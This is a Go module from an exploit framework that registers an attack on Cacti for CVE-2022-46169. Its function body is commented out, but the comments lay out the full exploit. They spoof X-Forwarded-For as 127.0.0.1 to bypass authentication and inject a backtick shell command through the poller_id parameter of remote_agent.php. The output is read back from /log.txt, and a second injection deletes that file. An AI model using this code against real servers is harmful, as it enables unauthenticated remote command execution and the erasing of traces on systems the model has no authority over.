package exp_Cacti

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
)

type Exp_CVE_2022_46169 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_46169) Attack_cmd1() (expResult exp_model.ExpResult) {
	//cmd := self.MustGetStringParam("cmd")
	//// 默认配置
	//headers := self.GetInitExpHeaders()
	//local_data_ids := self.MustGetStringParam("local_data_ids")
	//host_id := self.MustGetStringParam("host_id")
	//// 构造payload
	//payload := "/remote_agent.php?action=polldata&local_data_ids[0]=" + local_data_ids + "&host_id=" + host_id + "&poller_id=`cmd>log.txt`"
	//payload = strings.ReplaceAll(payload, "cmd", url.QueryEscape(cmd))
	//headers.Set("X-Forwarded-For", "127.0.0.1")
	//httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, payload), headers)
	//if httpresp.Err != nil {
	//    expResult.Err = httpresp.Err.Error()
	//    return
	//}
	//if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `local_data_id`) {
	//    expResult.Status = true
	//    httpresp = self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/log.txt"), headers)
	//    if httpresp.Err != nil {
	//        expResult.Err = httpresp.Err.Error()
	//        return
	//    }
	//    expResult.Result = httpresp.Body
	//    httpresp = self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/remote_agent.php?action=polldata&local_data_ids[0]="+local_data_ids+"&host_id="+host_id+"&poller_id=`rm%20log.txt`"), headers)
	//    if httpresp.Err != nil {
	//        expResult.Err = httpresp.Err.Error()
	//        return
	//    }
	//} else {
	//    self.EchoErrMsg("漏洞利用失败！")
	//}
	return
}
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2022_46169{}, "exp_CVE_2022_46169.yml")
}
